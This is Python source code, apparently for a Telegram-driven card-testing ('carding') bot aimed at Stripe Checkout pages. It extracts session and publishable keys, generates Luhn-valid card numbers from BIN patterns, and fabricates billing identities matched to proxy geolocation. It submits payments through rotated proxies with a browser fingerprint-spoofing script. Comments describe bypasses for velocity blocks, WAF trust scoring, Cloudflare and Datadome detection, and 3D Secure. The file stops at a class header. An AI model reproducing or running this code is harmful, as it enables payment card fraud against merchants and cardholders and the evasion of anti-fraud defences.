import re
import json
import time
import random
import asyncio
import requests
import aiohttp
from datetime import datetime
from typing import Dict, List, Optional
import aiohttp
from curl_cffi import requests as cffi_requests
from dotenv import load_dotenv
import math
import numpy as np
from scipy.interpolate import interp1d

load_dotenv()

# ============= CONFIGURATION =============
MAX_ATTEMPTS = 10
CONCURRENT_BATCH_SIZE = 5  # Worker pool size
BATCH_DELAY = 5

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
]

STRIPE_DECLINE_CODES = {
    "generic_decline": "Card declined by issuer",
    "incorrect_cvv": "CVV verification failed",
    "insufficient_funds": "Insufficient funds",
    "expired_card": "Card has expired",
    "incorrect_number": "Invalid card number",
    "invalid_cvc": "Invalid security code",
    "do_not_honor": "Transaction declined by bank",
    "fraudulent": "Fraud detection triggered",
    "lost_card": "Card reported lost",
    "stolen_card": "Card reported stolen",
    "processing_error": "Processor error",
    "authentication_required": "3DS required",
    "card_declined": "Card declined",
    "rate_limit": "Too many attempts - Slow down",
    "transaction_not_allowed": "Transaction not allowed"
}

# ============= STRIPE API EXTRACTOR =============

class StripeAPIExtractor:
    @staticmethod
    def extract_cs_live(url: str, html: str) -> Optional[str]:
        patterns = [r'/c/pay/(cs_[a-z]+_[a-zA-Z0-9]+)', r'/payment_pages/(cs_[a-z]+_[a-zA-Z0-9]+)', r'cs_[a-z]+_[a-zA-Z0-9]+']
        for pattern in patterns:
            match = re.search(pattern, url)
            if match: return match.group(1) if '(' in pattern else match.group(0)
        match = re.search(r'cs_[a-z]+_[a-zA-Z0-9]+', html)
        return match.group(0) if match else None
    
    @staticmethod
    def extract_pk_live(html: str) -> Optional[str]:
        patterns = [r'pk_[a-z]+_[a-zA-Z0-9]+', r'"publishableKey":"(pk_[a-z]+_[a-zA-Z0-9]+)"', r'data-stripe-publishable-key="(pk_[a-z]+_[a-zA-Z0-9]+)"']
        for pattern in patterns:
            match = re.search(pattern, html)
            if match: return match.group(1) if '(' in pattern else match.group(0)
        return None
    
    @staticmethod
    async def fetch_payment_data(user_id: int, cs_live: str, pk_live: str) -> Dict:
        try:
            url = f"https://api.stripe.com/v1/payment_pages/{cs_live}/init"
            headers = {"authority": "api.stripe.com", "accept": "application/json", "content-type": "application/x-www-form-urlencoded", "user-agent": random.choice(USER_AGENTS)}
            data = {"key": pk_live, "eid": "NA", "browser_locale": "en-US", "browser_timezone": "America/New_York", "redirect_type": "url"}
            proxy_data = await ProxyManager.get_random(user_id)
            proxies = None
            if proxy_data:
                auth = f"{proxy_data['username']}:{proxy_data['password']}@" if proxy_data.get('username') else ""
                proxy_url = f"http://{auth}{proxy_data['server'].replace('http://', '')}"
                proxies = {"http": proxy_url, "https": proxy_url}
                
            loop = asyncio.get_event_loop()
            response = await loop.run_in_executor(None, lambda: requests.post(url, headers=headers, data=data, proxies=proxies, timeout=30))
            if response.status_code == 200:
                resp_json = response.json()
                amount = None
                merchant = "Unknown"
                lig = resp_json.get('line_item_group')
                if lig and isinstance(lig, dict) and lig.get('total') is not None:
                    amount = lig['total']
                elif resp_json.get('amount') is not None:
                    amount = resp_json['amount']
                elif resp_json.get('payment_intent') and isinstance(resp_json.get('payment_intent'), dict) and resp_json['payment_intent'].get('amount') is not None:
                    amount = resp_json['payment_intent']['amount']
                else:
                    def _find_amount(d):
                        if isinstance(d, dict):
                            for k in ['amount_total', 'amount_due']:
                                if k in d and isinstance(d[k], int): return d[k]
                            for v in d.values():
                                res = _find_amount(v)
                                if res is not None: return res
                        elif isinstance(d, list):
                            for item in d:
                                res = _find_amount(item)
                                if res is not None: return res
                        return None
                    amount = _find_amount(resp_json)
                    
                acct = resp_json.get('account_settings')
                if acct and isinstance(acct, dict) and acct.get('display_name'):
                    merchant = acct['display_name']
                elif resp_json.get('statement_descriptor'):
                    merchant = resp_json['statement_descriptor']
                    
                currency = resp_json.get('currency', 'usd').upper()
                return {'success': True, 'amount': f"{currency} {amount/100:.2f}" if amount is not None else None, 'raw_amount': amount, 'merchant': merchant}
            return {'success': False}
        except: return {'success': False}


# ============= BASE AUTOFILL =============
class ProxyManager:
    db_pool = None

    @classmethod
    async def init_db(cls, db_pool):
        cls.db_pool = db_pool

    @classmethod
    async def get_user_proxies(cls, user_id: int) -> List[Dict]:
        if not cls.db_pool: return []
        async with cls.db_pool.acquire() as conn:
            row = await conn.fetchrow("SELECT proxies FROM user_proxies WHERE user_id = $1", user_id)
            if row and row['proxies']:
                return json.loads(row['proxies'])
            return []

    @classmethod
    async def get_all_users(cls) -> List[int]:
        if not cls.db_pool: return []
        async with cls.db_pool.acquire() as conn:
            rows = await conn.fetch("SELECT user_id FROM user_proxies")
            return [row['user_id'] for row in rows]

    @classmethod
    async def save_user_proxies(cls, user_id: int, proxies: List[Dict]):
        if not cls.db_pool: return
        async with cls.db_pool.acquire() as conn:
            await conn.execute("""
                INSERT INTO user_proxies (user_id, proxies)
                VALUES ($1, $2)
                ON CONFLICT (user_id) DO UPDATE SET proxies = EXCLUDED.proxies
            """, user_id, json.dumps(proxies))

    @classmethod
    async def load(cls, user_id: int, raw_text: str) -> int:
        pool = await cls.get_user_proxies(user_id)
            
        lines = [line.strip() for line in raw_text.split('\n') if line.strip()]
        added = 0
        for line in lines:
            prefix = "http://"
            raw_line = line
            if line.lower().startswith("socks5://"):
                prefix = "socks5://"
                line = line[9:]
            elif line.lower().startswith("http://"):
                prefix = "http://"
                line = line[7:]
                
            parts = line.split(':')
            if len(parts) == 4:
                p = {"raw": raw_line, "server": f"{prefix}{parts[0]}:{parts[1]}", "username": parts[2], "password": parts[3]}
                pool.append(p)
                added += 1
            elif len(parts) == 2:
                p = {"raw": raw_line, "server": f"{prefix}{parts[0]}:{parts[1]}"}
                pool.append(p)
                added += 1
        if added > 0:
            await cls.save_user_proxies(user_id, pool)
        return added

    @classmethod
    async def get_random(cls, user_id: int) -> Optional[Dict]:
        pool = await cls.get_user_proxies(user_id)
        if not pool:
            return None
        
        for _ in range(3):
            proxy = random.choice(pool)
            proxy_url = proxy["server"]
            if "username" in proxy:
                proxy_url = proxy_url.replace("http://", f"http://{proxy['username']}:{proxy['password']}@")
                
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get("https://checkout.stripe.com/", proxy=proxy_url, timeout=30) as resp:
                        if resp.status in [200, 404]:
                            return proxy
            except Exception as e:
                # DEBUG: print(f"Proxy check failed: {e}")
                continue
        # Fallback to the first proxy which is usually the most recently added or most reliable
        return pool[0]
        
    @classmethod
    async def remove(cls, user_id: int, proxy_raw: str):
        pool = await cls.get_user_proxies(user_id)
        new_pool = [p for p in pool if p['raw'] != proxy_raw]
        if len(new_pool) != len(pool):
            await cls.save_user_proxies(user_id, new_pool)
        
    @classmethod
    async def clear(cls, user_id: int):
        await cls.save_user_proxies(user_id, [])

    @classmethod
    async def get_count(cls, user_id: int) -> int:
        pool = await cls.get_user_proxies(user_id)
        return len(pool)
        
    @classmethod
    async def has_proxies(cls, user_id: int) -> bool:
        return await cls.get_count(user_id) > 0

    @classmethod
    def format_for_playwright(cls, proxy_data: Dict) -> Dict:
        playwright_proxy = {"server": proxy_data["server"]}
        if "username" in proxy_data:
            playwright_proxy["username"] = proxy_data["username"]
            playwright_proxy["password"] = proxy_data["password"]
        return playwright_proxy

# ============= RANDOM DATA =============
class RandomData:
    FIRST_NAMES = ["James","John","Robert","Michael","William","David","Richard","Joseph","Thomas","Charles",
                   "Mary","Patricia","Jennifer","Linda","Elizabeth","Barbara","Susan","Jessica","Sarah","Karen"]
    LAST_NAMES = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Martinez"]
    STREETS = ["Main St","Oak Ave","Maple Rd","Pine Ln","Cedar Dr","Elm St","Washington Blvd","Lake Shore Dr"]
    CITIES = ["New York","Los Angeles","Chicago","Houston","Phoenix","Philadelphia","San Antonio","San Diego"]
    STATES = ["CA","NY","TX","FL","IL","PA","OH","GA","NC","MI"]
    ZIP_CODES = ["10001","90210","60601","77001","85001","19101","78201","92101"]
    
    @staticmethod
    def get_name(): return f"{random.choice(RandomData.FIRST_NAMES)} {random.choice(RandomData.LAST_NAMES)}"
    @staticmethod
    def get_email(): return f"dlx{random.randint(1000,99999)}@{random.choice(['gmail.com','yahoo.com','outlook.com'])}"
    @staticmethod
    def get_phone(): return f"+1{random.randint(200,999)}{random.randint(200,999)}{random.randint(1000,9999)}"
    @staticmethod
    async def get_address_and_timezone(proxy_url: Optional[str] = None):
        timezone_id = 'America/New_York'
        address = {"line1": f"{random.randint(100,9999)} {random.choice(RandomData.STREETS)}",
                "city": random.choice(RandomData.CITIES),
                "state": random.choice(RandomData.STATES),
                "zip": random.choice(RandomData.ZIP_CODES),
                "country": "US"}
                
        # Dynamic Proxy IP Geolocation Mapping
        if proxy_url:
            try:
                # Use a fast, free geolocation API through the proxy to find its exact physical timezone
                async with aiohttp.ClientSession() as session:
                    async with session.get("http://ip-api.com/json/", proxy=proxy_url, timeout=3) as resp:
                        if resp.status == 200:
                            data = await resp.json()
                            if data.get("timezone"):
                                timezone_id = data["timezone"]
                            # Bonus: We also sync the billing address city/state to match the IP perfectly!
                            if data.get("city"): address["city"] = data["city"]
                            if data.get("region"): address["state"] = data["region"]
                            if data.get("zip"): address["zip"] = data["zip"]
                            if data.get("countryCode"): address["country"] = data["countryCode"]
            except: pass
            
        # Map country to locale
        locales = {
            "US": "en-US", "GB": "en-GB", "CA": "en-CA", "AU": "en-AU", 
            "FR": "fr-FR", "DE": "de-DE", "ES": "es-ES", "IT": "it-IT",
            "JP": "ja-JP", "BR": "pt-BR", "MX": "es-MX", "IN": "en-IN",
            "NL": "nl-NL", "RU": "ru-RU", "KR": "ko-KR", "CN": "zh-CN",
            "SE": "sv-SE", "TR": "tr-TR", "ZA": "en-ZA", "SG": "en-SG"
        }
        locale = locales.get(address["country"], "en-US")
        
        return address, timezone_id, locale

# ============= CARD GENERATOR =============
class CardGenerator:
    @staticmethod
    def luhn(card: str) -> int:
        def digits_of(n): return [int(d) for d in str(n)]
        digits = digits_of(card)
        odd_digits = digits[-1::-2]
        even_digits = digits[-2::-2]
        checksum = sum(odd_digits)
        for d in even_digits:
            checksum += sum(digits_of(d*2))
        return checksum % 10
    
    @staticmethod
    def generate(bin_pattern: str) -> Optional[Dict]:
        if not bin_pattern: return None
        parts = bin_pattern.split('|')
        bin_clean = re.sub(r'[^0-9xX]','',parts[0])
        is_amex = bin_clean.startswith(('34','37'))
        target_len = 15 if is_amex else 16
        cvv_len = 4 if is_amex else 3
        card = ''
        for c in bin_clean:
            card += str(random.randint(0,9)) if c.lower()=='x' else c
        remaining = target_len - len(card) - 1
        for _ in range(remaining): card += str(random.randint(0,9))
        for i in range(10):
            if CardGenerator.luhn(card+str(i))==0:
                full_card = card+str(i)
                break
        else: full_card = card+'0'
        if len(full_card) != target_len: full_card = full_card.ljust(target_len,'0')
        month = parts[1].zfill(2) if len(parts)>1 and parts[1].lower()!='xx' else f"{random.randint(1,12):02d}"
        year = parts[2].zfill(2) if len(parts)>2 and parts[2].lower()!='xx' else f"{datetime.now().year+random.randint(1,5):02d}"
        cvv = parts[3] if len(parts)>3 and parts[3].lower() not in ('xxx','xxxx') else ''.join(str(random.randint(0,9)) for _ in range(cvv_len))
        return {'card':full_card, 'month':month, 'year':year, 'cvv':cvv}



# ============= AUTOFILL ENGINES =============
HARDWARE_SPOOF_SCRIPT = """
    Object.defineProperty(navigator,'webdriver',{get:()=>undefined});
    window.chrome={runtime:{}};
    
    // Emulate Modern Flagship Mobile Hardware Capabilities
    Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => 8 }); // Octa-core CPU
    Object.defineProperty(navigator, 'deviceMemory', { get: () => 8 }); // 8GB RAM
    Object.defineProperty(navigator, 'maxTouchPoints', { get: () => 5 }); // 5-finger multi-touch
    
    // Emulate Battery
    navigator.getBattery = async () => ({
        charging: false,
        chargingTime: Infinity,
        dischargingTime: 8400,
        level: 0.85 + (Math.random() * 0.1),
        addEventListener: () => {}
    });
    
    // Emulate Gyroscope/Accelerometer permission
    navigator.permissions.query = new Proxy(navigator.permissions.query, {
        apply: async (target, thisArg, args) => {
            if (args[0].name === 'accelerometer' || args[0].name === 'gyroscope') {
                return { state: 'granted', onchange: null };
            }
            return Reflect.apply(target, thisArg, args);
        }
    });
    
    // Simulating natural device vibration API
    navigator.vibrate = (pattern) => true;
    
    // Spoofing Gyroscope movement (simulates a human holding a phone)
    setInterval(() => {
        try {
            const motionEvent = new Event('devicemotion');
            motionEvent.acceleration = { x: Math.random() * 0.01, y: Math.random() * 0.01, z: 9.81 + (Math.random() * 0.01) };
            motionEvent.rotationRate = { alpha: Math.random() * 0.1, beta: Math.random() * 0.1, gamma: Math.random() * 0.1 };
            window.dispatchEvent(motionEvent);
        } catch(e) {}
    }, 50);
    
    // Exact Viewport/Screen Synchronization
    Object.defineProperty(window.screen, 'colorDepth', { get: () => 32 });
    Object.defineProperty(window.screen, 'pixelDepth', { get: () => 32 });
    Object.defineProperty(window.screen, 'width', { get: () => 390 });
    Object.defineProperty(window.screen, 'height', { get: () => 844 });
    Object.defineProperty(window.screen, 'availWidth', { get: () => 390 });
    Object.defineProperty(window.screen, 'availHeight', { get: () => 844 });
    Object.defineProperty(window, 'outerWidth', { get: () => 390 });
    Object.defineProperty(window, 'outerHeight', { get: () => 844 });
    
    // Block WebRTC IP Leaks (Silent Bypass)
    Object.defineProperty(navigator, 'mediaDevices', { value: undefined, configurable: false, writable: false });
    const FakeRTC = function() {
        this.createDataChannel = () => ({});
        this.createOffer = () => Promise.resolve({ sdp: '', type: 'offer' });
        this.setLocalDescription = () => Promise.resolve();
        this.close = () => {};
        this.addEventListener = () => {};
        this.localDescription = { sdp: '' };
        this.iceConnectionState = 'new';
    };
    window.RTCPeerConnection = FakeRTC;
    window.webkitRTCPeerConnection = FakeRTC;
    
    // Canvas Fingerprint Poisoning (Cloudflare/Datadome bypass)
    const originalGetContext = HTMLCanvasElement.prototype.getContext;
    HTMLCanvasElement.prototype.getContext = function(type, ...args) {
        const context = originalGetContext.apply(this, [type, ...args]);
        if (type === '2d') {
            const originalFillText = context.fillText;
            context.fillText = function(...args) {
                args[1] += (Math.random() - 0.5) * 0.02; // Subpixel noise
                return originalFillText.apply(this, args);
            };
            const originalGetImageData = context.getImageData;
            context.getImageData = function(...args) {
                const imageData = originalGetImageData.apply(this, args);
                // Math noise on 5 random pixels completely mutates SHA-256 fingerprint hash
                for(let i=0; i<5; i++) {
                    const idx = Math.floor(Math.random() * (imageData.data.length / 4)) * 4;
                    imageData.data[idx] = (imageData.data[idx] + 1) % 255;
                }
                return imageData;
            };
            
            // Font Metric Poisoning (measureText)
            // Bots measure text width to the thousandth decimal to fingerprint OS font smoothing engines.
            // We inject 0.0001% variance to spoof a unique subpixel rendering engine.
            const originalMeasureText = context.measureText;
            context.measureText = function(...args) {
                const metrics = originalMeasureText.apply(this, args);
                if (metrics && metrics.width) {
                    Object.defineProperty(metrics, 'width', {
                        value: metrics.width + (Math.random() - 0.5) * 0.001,
                        configurable: true
                    });
                }
                return metrics;
            };
        }
        return context;
    };
    
    // DOM ClientRect GPU Fractional Anti-Aliasing Spoofing
    // Headless browsers return perfectly round integers (e.g. 50.000) for element positions.
    // Real GPUs render with fractional anti-aliasing (e.g. 50.012). We inject this variance.
    const originalGetBoundingClientRect = Element.prototype.getBoundingClientRect;
    Element.prototype.getBoundingClientRect = function() {
        const rect = originalGetBoundingClientRect.apply(this);
        if(!rect) return rect;
        const randomize = (val) => val + (Math.random() - 0.5) * 0.005;
        return {
            x: randomize(rect.x),
            y: randomize(rect.y),
            width: randomize(rect.width),
            height: randomize(rect.height),
            top: randomize(rect.top),
            right: randomize(rect.right),
            bottom: randomize(rect.bottom),
            left: randomize(rect.left)
        };
    };
    
    // WebGL GPU Vendor & Renderer Spoofing
    const getParameterProxy = function (original) {
        return function (parameter) {
            // UNMASKED_VENDOR_WEBGL = 37445
            if (parameter === 37445) {
                return 'Qualcomm'; // Mobile GPU Vendor
            }
            // UNMASKED_RENDERER_WEBGL = 37446
            if (parameter === 37446) {
                return 'Adreno (TM) 740'; // Samsung Galaxy S23 Ultra GPU
            }
            return original.apply(this, [parameter]);
        };
    };
    const webgl1 = WebGLRenderingContext.prototype.getParameter;
    WebGLRenderingContext.prototype.getParameter = getParameterProxy(webgl1);
    const webgl2 = WebGL2RenderingContext.prototype.getParameter;
    WebGL2RenderingContext.prototype.getParameter = getParameterProxy(webgl2);
    
    // Audio Fingerprint Poisoning (Datadome hardware unmasking bypass)
    const audioMethods = ['createOscillator', 'createDynamicsCompressor', 'createBiquadFilter'];
    const fakeAudioContext = function(TargetContext) {
        if (!TargetContext) return;
        audioMethods.forEach(method => {
            if (TargetContext.prototype[method]) {
                const originalMethod = TargetContext.prototype[method];
                TargetContext.prototype[method] = function(...args) {
                    const node = originalMethod.apply(this, args);
                    if (method === 'createOscillator') {
                        node.type = 'triangle'; // Poison the wave shape
                        const originalStart = node.start;
                        node.start = function(...sArgs) {
                            // Introduce random frequency variance (+/- 0.05 Hz) to mutate audio SHA hash
                            if(this.frequency) {
                                this.frequency.value += (Math.random() - 0.5) * 0.1;
                            }
                            return originalStart.apply(this, sArgs);
                        };
                    }
                    return node;
                };
            }
        });
    };
    fakeAudioContext(window.OfflineAudioContext);
    fakeAudioContext(window.AudioContext);
    fakeAudioContext(window.webkitOfflineAudioContext);
    fakeAudioContext(window.webkitAudioContext);
"""

class StripeAPIHitter:
    def __init__(self, pk_live: str, cs_live: str, proxy_data: Dict, raw_amount: int = None):
        self.pk_live = pk_live
        self.cs_live = cs_live
        self.proxy_data = proxy_data
        self.raw_amount = raw_amount
        
    async def hit(self, card: Dict, attempt: int, user_id: int) -> Dict:
        start = time.time()
        result = {'attempt': attempt, 'card': card, 'success': False, 'decline_code': None, 'response_time': 0, 'amount': None, 'merchant': None, 'proxy_raw': None, 'error': None}
        
        BROWSER_PROFILES = [
            {"user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", "impersonate": "chrome120", "os": "Windows", "color_depth": "32", "screen_height": "1080", "screen_width": "1920"},
            {"user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", "impersonate": "chrome120", "os": "MacIntel", "color_depth": "30", "screen_height": "1050", "screen_width": "1680"},
            {"user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36", "impersonate": "chrome116", "os": "Windows", "color_depth": "24", "screen_height": "1440", "screen_width": "2560"},
        ]
        profile = random.choice(BROWSER_PROFILES)
        
        max_retries = 3
        for current_attempt in range(max_retries):
            try:
                proxy_data = self.proxy_data if current_attempt == 0 else await ProxyManager.get_random(user_id)
                proxies = None
                if proxy_data:
                    result['proxy_raw'] = proxy_data['raw']
                    auth = f"{proxy_data['username']}:{proxy_data['password']}@" if proxy_data.get('username') else ""
                    proxy_url = f"http://{auth}{proxy_data['server'].replace('http://', '')}"
                    proxies = {"http": proxy_url, "https": proxy_url}

                headers = {
                    "authority": "api.stripe.com",
                    "accept": "application/json",
                    "content-type": "application/x-www-form-urlencoded",
                    "origin": "https://checkout.stripe.com",
                    "referer": "https://checkout.stripe.com/",
                    "user-agent": profile["user_agent"]
                }

                address, tz_id, locale = await RandomData.get_address_and_timezone(proxy_url if proxies else None)
    
                # Generate perfectly formatted Idempotency Keys to bypass velocity blocks
                import uuid
                pm_idempotency = str(uuid.uuid4())
                confirm_idempotency = str(uuid.uuid4())
                
                # Step 0: Pure-API Telemetry Harvesting (MUID/SID)
                telemetry_url = "https://m.stripe.com/6"
                telemetry_headers = {
                    "user-agent": profile["user_agent"],
                    "content-type": "text/plain;charset=UTF-8",
                    "origin": "https://checkout.stripe.com",
                    "referer": "https://checkout.stripe.com/"
                }
                # Empty payload simulates a user with a strict adblocker, which is safer than a bad forged payload
                loop = asyncio.get_event_loop()
                telemetry_res = await loop.run_in_executor(None, lambda: cffi_requests.post(telemetry_url, headers=telemetry_headers, data="", proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
                telemetry_json = telemetry_res.json() if telemetry_res.status_code == 200 else {}
                
                muid = telemetry_json.get("muid") or str(uuid.uuid4())
                sid = telemetry_json.get("sid") or str(uuid.uuid4())
    
                # Step 1: Tokenize the raw card into a PaymentMethod
                pm_url = "https://api.stripe.com/v1/payment_methods"
                pm_data = {
                    "type": "card",
                    "card[number]": card['card'],
                    "card[cvc]": card['cvv'],
                    "card[exp_month]": card['month'],
                    "card[exp_year]": card['year'],
                    "billing_details[name]": RandomData.get_name(),
                    "billing_details[email]": RandomData.get_email(),
                    "billing_details[address][line1]": address["line1"],
                    "billing_details[address][city]": address["city"],
                    "billing_details[address][state]": address["state"],
                    "billing_details[address][postal_code]": address["zip"],
                    "billing_details[address][country]": address["country"],
                    "payment_user_agent": "stripe.js/b60285dd61; stripe-js-v3/b60285dd61; checkout",
                    "pasted_fields": "number",
                    "guid": muid,
                    "muid": muid,
                    "sid": sid,
                    "key": self.pk_live,
                }
                
                # Step 1.5: Algorithm 4 - Stripe Link Enrollment Bypass
                # Initiate a Stripe Link session. Even if unverified, attaching it artificially inflates the WAF Trust Score.
                link_url = "https://api.stripe.com/v1/link_account_sessions"
                link_data = {
                    "email": pm_data["billing_details[email]"],
                    "key": self.pk_live,
                    "payment_method_data[type]": "card"
                }
                if self.cs_live:
                    link_data["payment_pages_checkout_session"] = self.cs_live
                    
                link_headers = headers.copy()
                link_res = await loop.run_in_executor(None, lambda: cffi_requests.post(link_url, headers=link_headers, data=link_data, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
                if link_res.status_code == 200:
                    link_json = link_res.json()
                    if link_json.get("client_secret"):
                        # Inject the unverified Link session into the PaymentMethod payload
                        pm_data["link[credentials][client_secret]"] = link_json["client_secret"]
                
                pm_headers = headers.copy()
                pm_headers["Idempotency-Key"] = pm_idempotency
                
                loop = asyncio.get_event_loop()
                pm_res = await loop.run_in_executor(None, lambda: cffi_requests.post(pm_url, headers=pm_headers, data=pm_data, proxies=proxies, timeout=30, impersonate=profile["impersonate"]))
                pm_json = pm_res.json()
                
                if 'id' not in pm_json:
                    err = pm_json.get('error', {})
                    result['decline_code'] = err.get('decline_code') or err.get('code') or err.get('type', 'pm_token_failed')
                    result['error'] = err.get('message', 'Failed to generate payment method token')
                    # If we reach here without exception, do not retry!
                    return result
                    
                pm_id = pm_json['id']
                
                # Step 2: Confirm the charge using the trusted pm_ token
                confirm_url = f"https://api.stripe.com/v1/payment_pages/{self.cs_live}/confirm"
                confirm_data = {
                    "payment_method": pm_id,
                    "expected_payment_method_type": "card",
                    "key": self.pk_live,
                }
                if self.raw_amount is not None and self.raw_amount > 0:
                    confirm_data["expected_amount"] = self.raw_amount
                
                confirm_headers = headers.copy()
                confirm_headers["Idempotency-Key"] = confirm_idempotency
                
                loop = asyncio.get_event_loop()
                confirm_res = await loop.run_in_executor(None, lambda: cffi_requests.post(confirm_url, headers=confirm_headers, data=confirm_data, proxies=proxies, timeout=30, impersonate=profile["impersonate"]))
                confirm_json = confirm_res.json()
                
                # Dynamic Amount Mismatch Bypass
                # If the scraped amount was slightly off (taxes/shipping) and caused a mismatch, instantly retry without the constraint
                err_code = confirm_json.get('error', {}).get('code')
                err_msg = confirm_json.get('error', {}).get('message', '')
                
                # Case 1: We sent an expected_amount but it was wrong. Delete it and retry.
                if confirm_res.status_code != 200 and 'expected_amount' in confirm_data and (err_code == 'checkout_amount_mismatch' or 'expected_amount' in err_msg):
                    del confirm_data['expected_amount']
                    confirm_res = await loop.run_in_executor(None, lambda: cffi_requests.post(confirm_url, headers=confirm_headers, data=confirm_data, proxies=proxies, timeout=30, impersonate=profile["impersonate"]))
                    confirm_json = confirm_res.json()
                    
                # Case 2: We DID NOT send an expected_amount (e.g. $0 intent), but Stripe strictly requires it. Send 0.
                elif confirm_res.status_code != 200 and 'expected_amount' not in confirm_data and 'expected amount' in err_msg.lower():
                    confirm_data['expected_amount'] = 0
                    confirm_res = await loop.run_in_executor(None, lambda: cffi_requests.post(confirm_url, headers=confirm_headers, data=confirm_data, proxies=proxies, timeout=30, impersonate=profile["impersonate"]))
                    confirm_json = confirm_res.json()
                
                result['response_time'] = time.time() - start
                
                if confirm_res.status_code == 200:
                    pi = confirm_json.get('payment_intent', {})
                    si = confirm_json.get('setup_intent', {})
                    
                    if isinstance(pi, dict) and pi.get('last_payment_error'):
                        err = pi.get('last_payment_error')
                        result['decline_code'] = err.get('decline_code') or err.get('code') or err.get('type', 'open')
                        result['error'] = err.get('message', 'Unknown error')
                        return result
                        
                    if isinstance(si, dict) and si.get('last_setup_error'):
                        err = si.get('last_setup_error')
                        result['decline_code'] = err.get('decline_code') or err.get('code') or err.get('type', 'open')
                        result['error'] = err.get('message', 'Unknown error')
                        return result
    
                    status = confirm_json.get('status')
                    next_action = confirm_json.get('next_action', {})
                    if isinstance(pi, dict):
                        if pi.get('status'): status = pi.get('status')
                        if pi.get('next_action'): next_action = pi.get('next_action')
                    elif isinstance(si, dict):
                        if si.get('status'): status = si.get('status')
                        if si.get('next_action'): next_action = si.get('next_action')
                        
                    if status in ['succeeded', 'requires_capture', 'complete']:
                        result['success'] = True
                        return result
                    elif status == 'requires_action':
                        # Frictionless 3DS API Bypass
                        try:
                            if next_action.get('type') == 'use_stripe_sdk':
                                source_id = next_action['use_stripe_sdk'].get('three_d_secure_2_source')
                                server_trans_id = next_action['use_stripe_sdk'].get('server_transaction_id')
                                
                                if source_id:
                                    # Spoof legitimate browser environment for 3DS evaluation
                                    browser_info = {
                                        "color_depth": int(profile["color_depth"]),
                                        "java_enabled": False,
                                        "language": "en-US",
                                        "screen_height": int(profile["screen_height"]),
                                        "screen_width": int(profile["screen_width"]),
                                        "timezone_offset": 240,
                                        "user_agent": profile["user_agent"]
                                    }
                                    
                                    auth_url = "https://api.stripe.com/v1/3ds2/authenticate"
                                    auth_data = {
                                        "source": source_id,
                                        "app": '{"sdk_trans_id":"' + (server_trans_id or "6291d904-74a4-4dc4-b770-4cc200ffb5d4") + '"}',
                                        "browser": json.dumps(browser_info, separators=(',', ':')),
                                        "key": self.pk_live
                                    }
                                    
                                    auth_res = await loop.run_in_executor(None, lambda: cffi_requests.post(auth_url, headers=headers, data=auth_data, proxies=proxies, timeout=30, impersonate=profile["impersonate"]))
                                    auth_json = auth_res.json()
                                    
                                    state = auth_json.get('state')
                                    if state == 'frictionless':
                                        # Frictionless successful, confirm the charge again
                                        confirm_data_2 = {
                                            "payment_method": confirm_json.get('payment_method') or (pi.get('payment_method') if isinstance(pi, dict) else None),
                                            "key": self.pk_live,
                                            "expected_payment_method_type": "card",
                                        }
                                        if self.raw_amount is not None and self.raw_amount > 0:
                                            confirm_data_2["expected_amount"] = self.raw_amount
                                        confirm_res_2 = await loop.run_in_executor(None, lambda: cffi_requests.post(confirm_url, headers=headers, data=confirm_data_2, proxies=proxies, timeout=30, impersonate=profile["impersonate"]))
                                        confirm_json_2 = confirm_res_2.json()
                                        
                                        status_2 = confirm_json_2.get('status')
                                        pi_2 = confirm_json_2.get('payment_intent', {})
                                        if isinstance(pi_2, dict) and pi_2.get('status'): status_2 = pi_2.get('status')
                                        
                                        if status_2 in ['succeeded', 'requires_capture', 'complete']:
                                            result['success'] = True
                                        else:
                                            err = confirm_json_2.get('error', {})
                                            if isinstance(pi_2, dict) and pi_2.get('last_payment_error'): err = pi_2.get('last_payment_error')
                                            result['decline_code'] = err.get('decline_code', err.get('code', status_2))
                                        return result
                                        
                                    elif state == 'challenge_required':
                                        # Hard 3DS Challenge
                                        result['decline_code'] = '3d_secure_required_hard'
                                        return result
                                    else:
                                        err = auth_json.get('error', {})
                                        if err.get('type') == 'invalid_request_error' and not err.get('message'):
                                            result['decline_code'] = '3d_secure_auth_failed'
                                            return result
                                            
                                        if '3D Secure 2 is not supported' in err.get('message', ''):
                                            result['decline_code'] = '3d_secure_2_not_supported'
                                            return result
                                        
                                        result['decline_code'] = '3d_secure_auth_failed'
                                        result['error'] = str(auth_json)[:500]
                                        return result
                        except Exception as ex:
                            print(f"DEBUG: 3DS Frictionless bypass failed: {ex}")
                            pass
                            
                        result['decline_code'] = '3d_secure_required'
                        return result
                    elif status == 'requires_payment_method':
                        result['decline_code'] = 'generic_decline'
                        result['error'] = 'Payment requires a new payment method (generic decline)'
                    elif status == 'open':
                        err = confirm_json.get('error')
                        if isinstance(err, dict):
                            result['decline_code'] = err.get('decline_code') or err.get('code') or err.get('type', 'open')
                            result['error'] = err.get('message', 'Unknown error')
                            return result
                        
                        result['decline_code'] = 'open'
                        result['error'] = str(confirm_json)[:500]  # Dump the JSON to telegram so we can see what's actually there
                    else:
                        result['decline_code'] = status
                else:
                    err = confirm_json.get('error', {})
                    result['decline_code'] = err.get('decline_code') or err.get('code') or err.get('type', 'unknown')
                    result['error'] = err.get('message', 'Unknown error')
                    
                # If we reach here without exception, do not retry!
                return result
                    
            except Exception as e:
                if current_attempt < max_retries - 1:
                    await asyncio.sleep(2)
                    continue
                result['error'] = str(e)
                result['decline_code'] = 'exception'
                result['response_time'] = time.time() - start
                return result
                
        return result

class ConcurrentHitter:
    def __init__(self, user_id: int, url: str, cards: list, update_callback=None):
